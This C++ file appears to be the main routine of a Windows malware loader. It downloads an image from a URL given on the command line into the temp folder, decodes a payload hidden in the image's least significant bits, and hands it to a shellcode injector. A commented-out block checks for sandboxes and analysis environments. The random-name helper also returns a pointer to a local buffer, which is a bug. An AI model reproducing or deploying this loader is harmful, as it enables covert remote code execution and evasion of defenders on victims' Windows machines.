#include <iostream>
#include "LSB.h"
#include "BasicHandling.h"
#include <Windows.h>
#include "download.h"
#include "SimpleShellcodeInjector.h"
#include <sstream>
#include <time.h>
#include "check.h"
using namespace std;

void usage()
{
    printf("[+] usage: SSL.exe url\n");
}

char* randstr(const int len)
{
    char str[20];
    srand(time(NULL));
    int i;
    for (i = 0; i < len; ++i)
    {
        switch ((rand() % 3))
        {
        case 1:
            str[i] = 'A' + rand() % 26;
            break;
        case 2:
            str[i] = 'a' + rand() % 26;
            break;
        default:
            str[i] = '0' + rand() % 10;
            break;
        }
    }
    str[i] = '\0';
    return str;
}

int main(int argc, char* argv[])
{
    /*
    if (checkUptime(360000) || language() || checkthreatbook() || checkCPUTemperature() || checkMemory(4) || checkoffice(2))
    {
        printf("2333");
        return 0;
    }*/
    DWORD dwRet;
    LPSTR pszOldVal;
    pszOldVal = (LPSTR)malloc(MAX_PATH * sizeof(char));
    dwRet = GetEnvironmentVariableA("TMP", pszOldVal, MAX_PATH);
    std::string stdstr = pszOldVal;
    const char* name = randstr(8);
    std::string filename = name;
    filename = stdstr + "\\" + filename + ".png";
   // printf("%s\n", filename.c_str());
    wstring wide_string = wstring(filename.begin(), filename.end());
    const wchar_t* imgpathname = wide_string.c_str();
    //download(L"https://xzfile.aliyuncs.com/media/upload/picture/20200715222956-a7d62b2e-c6a7-1.png", imgpathname, &dcallback);

    if (argc < 2 ) {
        puts("Fail! Check your input!\n");
        usage();
        return 0;
    }

    char buf[2048];
    int nChars = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, NULL, 0);
    const WCHAR* dowloadpath = new WCHAR[nChars];
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, (LPWSTR)dowloadpath, nChars);
    download(dowloadpath, imgpathname, &dcallback);


    const WCHAR* pwcsName = imgpathname;
    std::string text;
    if ((text = LSB_decode(pwcsName)) == "")
    {
        puts("Fail! Check your input!\n");
        //usage();
    }
    else
    {
       strcpy(buf, text.c_str());
       Go(buf);
       //std::cout << "Hidden string is: " << text;
    }
    
    return 0;
}